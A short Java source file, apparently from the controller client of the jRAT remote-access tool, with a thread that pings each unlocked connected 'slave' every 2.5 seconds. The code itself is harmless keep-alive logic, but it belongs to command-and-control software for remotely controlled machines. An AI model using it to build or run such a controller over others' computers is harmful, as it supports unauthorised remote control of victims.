package su.jrat.client.threads;

import su.jrat.client.AbstractSlave;
import su.jrat.client.Main;

public class ThreadPing extends Thread {

	public ThreadPing() {
		super("Ping thread");
	}

	public void run() {
		while (true) {
			try {
				for (int i = 0; i < Main.connections.size(); i++) {
					AbstractSlave slave = Main.connections.get(i);

					if (!slave.isLocked()) {
						slave.beginPing();
					}
				}
				Thread.sleep(2500L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
